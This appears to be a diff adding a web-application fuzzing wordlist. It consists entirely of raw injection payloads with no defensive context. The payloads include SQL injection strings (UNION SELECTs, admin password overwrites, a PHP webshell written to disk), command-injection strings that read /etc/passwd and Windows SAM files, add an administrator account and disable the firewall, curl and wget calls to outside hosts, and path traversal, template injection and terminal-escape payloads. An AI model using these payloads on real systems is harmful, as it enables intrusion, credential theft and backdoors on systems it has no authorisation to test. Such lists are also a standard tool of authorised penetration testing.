@@ -1,0 +1,694 @@
+"
+" & whoami
+" && whoami
+" OR "1"="1
+" OR "1"="1"#
+" OR "1"="1"; --
+" OR "1"="2
+" OR "1"="2"#
+" OR "1"="2"; --
+" OR 1="1
+" or "a"="a
+" or 1=1--
+" whoami
+" | whoami
+" || whoami
+"& ping -i 30 127.0.0.1 &"
+"'
+")
+"; whoami
+";id;"
+">
+"><h1>Hacked</h1>
+"\n/bin/ls -al\n"
+"|/usr/bin/id|"
+"|id|"
+"||/usr/bin/id|"
+$
+$;/usr/bin/id
+&
+& cat /etc/passwd
+& cat pwd
+& curl http://crowdshield.com/.testing/rce.txt
+& curl http://xerosecurity.com/rce.txt
+& dir
+& dir C:\
+& dir C:\Documents and Settings\*
+& dir C:\Users
+& id
+& ifconfig
+& ipconfig /all
+& ls -l /
+& ls -l /etc/
+& ls -l /home/*
+& ls -l /tmp
+& ls -l /var/www/*
+& ls -laR /etc
+& ls -laR /var/www
+& net localgroup Administrators hacker /ADD
+& net user hacker Password1 /ADD
+& net view
+& netsh firewall set opmode disable
+& netstat -an
+& ping -i 30 127.0.0.1 &
+& ping -n 30 127.0.0.1 &
+& pwd
+& sleep 1
+& sleep 10
+& sleep 15
+& sleep 5
+& sysinfo
+& systeminfo
+& type C:\WINNT\repair\SAM
+& type C:\Windows\repair\SAM
+& type C:\Windows\repair\SYSTEM
+& uname -a
+& wget http://crowdshield.com/.testing/rce.txt
+& wget http://xerosecurity.com/rce.txt
+& whoami
+&&
+&& cat /etc/passwd
+&& cat pwd
+&& curl http://xerosecurity.com/rce.txt
+&& curl https://crowdshield.com/.testing/rce_vuln.txt
+&& dir
+&& dir C:\
+&& dir C:\Documents and Settings\*
+&& dir C:\Users
+&& ifconfig
+&& ipconfig /all
+&& ls -l /
+&& ls -l /etc/
+&& ls -l /home/*
+&& ls -l /tmp
+&& ls -l /var/www/*
+&& ls -laR /etc
+&& ls -laR /var/www
+&& net localgroup Administrators hacker /ADD
+&& net user hacker Password1 /ADD
+&& net view
+&& netsh firewall set opmode disable
+&& netstat -an
+&& pwd
+&& sleep 1
+&& sleep 10
+&& sleep 15
+&& sleep 5
+&& sysinfo
+&& systeminfo
+&& type C:\WINNT\repair\SAM
+&& type C:\Windows\repair\SAM
+&& type C:\Windows\repair\SYSTEM
+&& uname -a
+&& wget http://xerosecurity.com/rce.txt
+&& wget https://crowdshield.com/.testing/rce_vuln.txt
+&& whoami
+&&&&id=1
+&&dir
+&&id
+&&ls;
+&&ping+-c+10+127.0.0.1&&
+&&type C:\\boot.ini
+&id
+&id=1&id=2
+&id=1;id=2
+&id=1?id=2
+&ls;
+'
+' & whoami
+' && whoami
+' OR '1'='1
+' OR '1'='1'#
+' OR '1'='1'; --
+' OR '1'='2
+' OR '1'='2'#
+' OR '1'='2'; --
+' OR 1='1
+' having 1=1--
+' or '1'='1' --
+' or '1'='1' /*
+' or 'a'='a
+' or 1=1#
+' or 1=1--
+' or 1=1/*
+' whoami
+' || whoami
+'"
+'" HAVING '"1"'='"0"'
+'" HAVING '"1"'='"0"'#
+'" HAVING '"1"'='"0"'--
+'" HAVING '"1"'='"1"'
+'" HAVING '"1"'='"1"' ORDER BY '"1
+'" HAVING '"1"'='"1"' ORDER BY '"1"'#
+'" HAVING '"1"'='"1"' ORDER BY '"1"'#--
+'" HAVING '"1"'='"1"' ORDER BY '"1"'--
+'" HAVING '"1"'='"1"' ORDER BY '"10"'#
+'" HAVING '"1"'='"1"' ORDER BY '"11"'#
+'" HAVING '"1"'='"1"' ORDER BY '"12"'#
+'" HAVING '"1"'='"1"' ORDER BY '"13"'#
+'" HAVING '"1"'='"1"' ORDER BY '"14"'#
+'" HAVING '"1"'='"1"' ORDER BY '"15"'#
+'" HAVING '"1"'='"1"' ORDER BY '"16"'#
+'" HAVING '"1"'='"1"' ORDER BY '"17"'#
+'" HAVING '"1"'='"1"' ORDER BY '"18"'#
+'" HAVING '"1"'='"1"' ORDER BY '"19"'#
+'" HAVING '"1"'='"1"' ORDER BY '"2"'#
+'" HAVING '"1"'='"1"' ORDER BY '"20"'#
+'" HAVING '"1"'='"1"' ORDER BY '"21"'#
+'" HAVING '"1"'='"1"' ORDER BY '"22"'#
+'" HAVING '"1"'='"1"' ORDER BY '"23"'#
+'" HAVING '"1"'='"1"' ORDER BY '"24"'#
+'" HAVING '"1"'='"1"' ORDER BY '"25"'#
+'" HAVING '"1"'='"1"' ORDER BY '"26"'#
+'" HAVING '"1"'='"1"' ORDER BY '"27"'#
+'" HAVING '"1"'='"1"' ORDER BY '"28"'#
+'" HAVING '"1"'='"1"' ORDER BY '"29"'#
+'" HAVING '"1"'='"1"' ORDER BY '"3"'#
+'" HAVING '"1"'='"1"' ORDER BY '"30"'#
+'" HAVING '"1"'='"1"' ORDER BY '"4"'#
+'" HAVING '"1"'='"1"' ORDER BY '"5"'#
+'" HAVING '"1"'='"1"' ORDER BY '"6"'#
+'" HAVING '"1"'='"1"' ORDER BY '"7"'#
+'" HAVING '"1"'='"1"' ORDER BY '"8"'#
+'" HAVING '"1"'='"1"' ORDER BY '"9"'#
+'" HAVING '"1"'='"1"'#
+'" HAVING '"1"'='"1"'#--
+'" HAVING '"1"'='"1"'--
+'" ORDER BY '"1
+'" ORDER BY '"1'"#
+'" ORDER BY '"10
+'" ORDER BY '"10'"#
+'" ORDER BY '"11
+'" ORDER BY '"11'"#
+'" ORDER BY '"12
+'" ORDER BY '"12'"#
+'" ORDER BY '"13
+'" ORDER BY '"13'"#
+'" ORDER BY '"14
+'" ORDER BY '"14'"#
+'" ORDER BY '"15
+'" ORDER BY '"15'"#
+'" ORDER BY '"16
+'" ORDER BY '"16'"#
+'" ORDER BY '"17
+'" ORDER BY '"17'"#
+'" ORDER BY '"18
+'" ORDER BY '"18'"#
+'" ORDER BY '"19
+'" ORDER BY '"19'"#
+'" ORDER BY '"2
+'" ORDER BY '"2'"#
+'" ORDER BY '"20
+'" ORDER BY '"20'"#
+'" ORDER BY '"21
+'" ORDER BY '"21'"#
+'" ORDER BY '"22
+'" ORDER BY '"22'"#
+'" ORDER BY '"23
+'" ORDER BY '"23'"#
+'" ORDER BY '"24
+'" ORDER BY '"24'"#
+'" ORDER BY '"25
+'" ORDER BY '"25'"#
+'" ORDER BY '"26
+'" ORDER BY '"26'"#
+'" ORDER BY '"27
+'" ORDER BY '"27'"#
+'" ORDER BY '"28
+'" ORDER BY '"28'"#
+'" ORDER BY '"29
+'" ORDER BY '"29'"#
+'" ORDER BY '"3
+'" ORDER BY '"3'"#
+'" ORDER BY '"30
+'" ORDER BY '"30'"#
+'" ORDER BY '"4
+'" ORDER BY '"4'"#
+'" ORDER BY '"5
+'" ORDER BY '"5'"#
+'" ORDER BY '"6
+'" ORDER BY '"6'"#
+'" ORDER BY '"7
+'" ORDER BY '"7'"#
+'" ORDER BY '"8
+'" ORDER BY '"8'"#
+'" ORDER BY '"9
+'" ORDER BY '"9'"#
+'">
+'& ping -i 30 127.0.0.1 &'
+')
+') or '1'='1--
+'+or+'a'+'a
+'; whoami
+';id;'
+'>
+'\n/bin/ls -al\n'
+'|/usr/bin/id|'
+'|id|'
+'||/usr/bin/id|'
+)
+*
+*; ls -lhtR /var/www/
++
+-
+--
+-->
+-1
+-1 OR 1=1
+-c 10 127.0.0.1
+-c 10 google.com
+..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\boot.ini
+/
+/*
+/* OR 1=1/*
+/../../windows/dvr2.ini
+//
+// OR 1=1//
+/???/c?t /?tc/?as?wd
+/???/c?t /etc/passwd
+/etc/passwd
+/index.html|id|
+0
+0 OR 1=1
+1
+1 OR 1=1
+1 ORDER BY 1--
+1 ORDER BY 1;#
+1 UNION SELECT ALL 1--
+1 UNION SELECT TOP 1 COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='users'--
+1 UNION SELECT TOP 1 TABLE_NAME FROM INFORMATION_SCHEMA.TABLES--
+1 having 1=1--
+1 or 1=1
+1 or 1=1#
+1 order by 1
+1 order by 2
+1 order by 3
+1 order by 4
+1 order by 5
+1 order by 6
+1 order by 7
+1 order by 8
+1 order by 9
+1"
+1#
+1'
+1' UNION SELECT '<?php system[$_REQUEST['cmd']); ?>' INTO OUTFILE '/pentest/targets/backdoor.php
+1' having 1=1--
+1' or '1'='1
+1' or '1'='1'#
+1' or '1'='1'--
+1' or 'x'='x
+1' union select * from users
+1' union select * from users; #
+1' union select * from users; --
+1'; UPDATE users SET password = 'password' WHERE username = 'admin'
+1)
+1/*
+1//
+10
+10 OR 1=1
+11
+11 OR 1=1
+12
+12 OR 1=1
+127.0.0.1 & cat /etc/passwd
+127.0.0.1 & pwd
+127.0.0.1 && cat /etc/passwd
+127.0.0.1 && pwd
+127.0.0.1; cat /etc/passwd
+127.0.0.1; pwd
+13
+13 OR 1=1
+14
+14 OR 1=1
+15
+15 OR 1=1
+16
+16 OR 1=1
+17
+17 OR 1=1
+18
+18 OR 1=1
+19
+19 OR 1=1
+1;
+1; SELECT * FROM members /*
+1; show tables
+1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
+1`
+2
+2 OR 1=1
+20
+20 OR 1=1
+21
+21 OR 1=1
+22
+22 OR 1=1
+23
+23 OR 1=1
+24
+24 OR 1=1
+25
+25 OR 1=1
+26
+26 OR 1=1
+27
+27 OR 1=1
+28
+28 OR 1=1
+29
+29 OR 1=1
+3
+3 OR 1=1
+30
+30 OR 1=1
+4
+4 OR 1=1
+5
+5 OR 1=1
+5 ORDER BY 6
+6
+6 OR 1=1
+7
+7 OR 1=1
+8
+8 OR 1=1
+9
+9 OR 1=1
+99
+:
+;
+; OR 1=1;
+; cat /etc/passwd
+; cat pwd
+; curl http://xerosecurity.com/rce.txt
+; curl https://crowdshield.com/.testing/rce_vuln.txt
+; dir
+; dir C:\
+; dir C:\Documents and Settings\*
+; dir C:\Users
+; id
+; ifconfig
+; ipconfig /all
+; ls -l /
+; ls -l /etc/
+; ls -l /home/*
+; ls -l /tmp
+; ls -l /var/www/*
+; ls -laR /etc
+; ls -laR /var/www
+; net localgroup Administrators hacker /ADD
+; net user hacker Password1 /ADD
+; net view
+; netsh firewall set opmode disable
+; netstat -an
+; pwd
+; sleep 1
+; sleep 10
+; sleep 15
+; sleep 5
+; sysinfo
+; systeminfo
+; type C:\WINNT\repair\SAM
+; type C:\Windows\repair\SAM
+; type C:\Windows\repair\SYSTEM
+; uname -a
+; wget http://xerosecurity.com/rce.txt
+; wget https://crowdshield.com/.testing/rce_vuln.txt
+; whoami
+;/usr/bin/id\n
+;/usr/bin/id|
+;id
+;id;
+;id=1?id=2
+;id\n
+;id|
+;ls
+;netstat -a;
+;uname;
+;{$_GET["cmd"]}
+;|/usr/bin/id|
+<
+=
+>
+?-s
+????id=1
+?id&=1
+?id&id=1
+?id;id=1
+?id=/:@&=+$&id=2
+?id=1#id=2
+?id=1&#38;id=2
+?id=1&amp;id=2
+?id=1&id=2
+?id=1\uc0a6id=2
+?id==1
+?id===1
+?id=id=1
+?id=id['1']=2
+?id[&id=2]=1
+?id['&id=1']=2
+?id[1&id=2]=1
+?id[=/:@&=+$&id=2]=1
+?id[=1&id=2]=3
+?id[]=1&id=2
+@
+@@
+B' or '1'='1
+Book' OR 'x'='x
+C:\boot.ini
+Content-Length : 0
+Content-Length abcd: 0
+Content_Length: 0
+GET / HTTP/1.1\nHost:localhost\n\n
+INJECTX
+INJECTXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
+ORDER BY 1
+ORDER BY 1--
+ORDER BY 10
+ORDER BY 11
+ORDER BY 12
+ORDER BY 13
+ORDER BY 14
+ORDER BY 15
+ORDER BY 16
+ORDER BY 17
+ORDER BY 18
+ORDER BY 19
+ORDER BY 2
+ORDER BY 2--
+ORDER BY 20
+ORDER BY 21
+ORDER BY 22
+ORDER BY 23
+ORDER BY 24
+ORDER BY 25
+ORDER BY 26
+ORDER BY 27
+ORDER BY 28
+ORDER BY 29
+ORDER BY 3
+ORDER BY 30
+ORDER BY 4
+ORDER BY 5
+ORDER BY 6
+ORDER BY 7
+ORDER BY 8
+ORDER BY 9
+XXXXXXXXXXXXXXXXXXXXXXXXXXX
+XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
+[
+[\r]Content-Length: 0
+\
+\'"
+\n
+\n/bin/ls -al\n
+\n/usr/bin/id;
+\n/usr/bin/id\n
+\n/usr/bin/id|
+\n\033[2curl http://135.23.158.130/.testing/term_escape.txt?vuln=1?user=\`whoami\`
+\n\033[2wget http://135.23.158.130/.testing/term_escape.txt?vuln=2?user=\`whoami\`
+\necho INJECTX\nexit\n\033[2Acurl https://crowdshield.com/.testing/rce_vuln.txt\n
+\necho INJECTX\nexit\n\033[2Asleep 5\n
+\necho INJECTX\nexit\n\033[2Awget https://crowdshield.com/.testing/rce_vuln.txt\n
+\nid;
+\nid\n
+\nid|
+\r
+\r\n
+]
+^
+_
+`
+` OR 1=`1
+`/usr/bin/id`
+`id`
+`ls`
+`ping 127.0.0.1`
+a'; SELECT * FROM users WHERE 't' = 't
+a);/usr/bin/id
+a);/usr/bin/id;
+a);/usr/bin/id|
+a);id
+a);id;
+a);id|
+a)|/usr/bin/id
+a)|/usr/bin/id;
+a)|id
+a)|id;
+a;/usr/bin/id
+a;/usr/bin/id;
+a;/usr/bin/id|
+a;id
+a;id;
+a;id\n
+a;id|
+admin
+admin' #
+admin' --
+admin'/*
+a|/usr/bin/id
+a|id
+a|id|
+c"a"t /etc/passwd
+c'a't /etc/passwd
+c:\winnt\repair\sam
+c\a\t /etc/passwd
+ca$@t /etc/passwd
+cat ${HOME:0:1}etc${HOME:0:1}passwd
+cat /etc/hosts
+cat /etc/passwd
+curl https://crowdshield.com/.testing/rce_vuln.txt
+dir
+dir C:\
+dir C:\Documents and Settings\*
+dir C:\Users
+guest
+ifconfig
+ipconfig
+ipconfig /all
+ls
+ls -l /
+ls -l /etc/
+ls -l /home/*
+ls -l /tmp
+ls -l /var/www/*
+ls -lh /etc/
+n
+net localgroup Administrators hacker /ADD
+net user hacker Password1 /ADD
+net view
+netsh firewall set opmode disable
+netstat
+netstat -an
+or 1=1--
+php://input
+pwd
+root
+route
+sleep 1
+sleep 10
+sleep 5
+sysinfo
+systeminfo
+test"
+test#
+test'
+test)
+test*; ls -lhtR /var/www/
+test--
+test/*
+test//
+test;
+test`
+type C:\WINNT\repair\SAM
+type C:\WINNT\repair\SYSTEM
+type C:\Windows\repair\SAM
+type C:\Windows\repair\SYSTEM
+uname
+uname -a
+wget https://crowdshield.com/.testing/rce_vuln.txt
+which curl
+which gcc
+which nc
+which netcat
+which perl
+which python
+which wget
+whoami
+x&&ping+-c+10+127.0.0.1||
+x' AND users IS NULL; --
+x' OR 'x'='x
+x' having 1=1--
+x' or 'x'='x
+x' or 'x'='x'#
+x' or 'x'='x'--
+x'; SELECT * FROM users; #
+x'; SELECT * FROM users; --
+x'; UPDATE users SET password = 'password' WHERE username = 'admin' #
+x'; UPDATE users SET password = 'password' WHERE username = 'admin' --
+x||ping+-c+10+127.0.0.1||
+y
+{1} + {1}
+{{4+4}}
+{{4+8}}
+{{person.name}}
+{{person.secret}}
+|
+| curl http://135.23.158.130/.testing/rce.txt
+| curl http://crowdshield.com/.testing/rce.txt
+| dir
+| dir C:\
+| dir C:\Documents and Settings\*
+| dir C:\Users
+| id
+| ifconfig
+| ipconfig /all
+| ls -l /
+| ls -l /etc/
+| ls -l /home/*
+| ls -l /tmp
+| ls -l /var/www/*
+| ls -laR /etc
+| ls -laR /var/www
+| net localgroup Administrators hacker /ADD
+| net user hacker Password1 /ADD
+| net view
+| netsh firewall set opmode disable
+| netstat -an
+| pwd
+| sleep 1
+| sleep 10
+| sleep 15
+| sleep 5
+| sysinfo
+| systeminfo
+| type C:\WINNT\repair\SAM
+| type C:\Windows\repair\SAM
+| type C:\Windows\repair\SYSTEM
+| uname -a
+| wget http://135.23.158.130/.testing/rce.txt
+| wget http://crowdshield.com/.testing/rce.txt
+| whoami
+|/bin/ls -al
+|/usr/bin/id
+|/usr/bin/id|
+|id
+|id;
+|id|
+|ls;
+|nid\n
+|usr/bin/id\n
+||
+|| sleep 10
+|| sleep 15
+||/usr/bin/id;
+||/usr/bin/id|
+||id
+||id>/var/www/html/id.txt||
+||id||
+||ls;
+||nslookup+`whoami`.localhost.com||
+||nslookup+www.nsa.gov||
+||ping+-c+10+127.0.0.1||
+Š
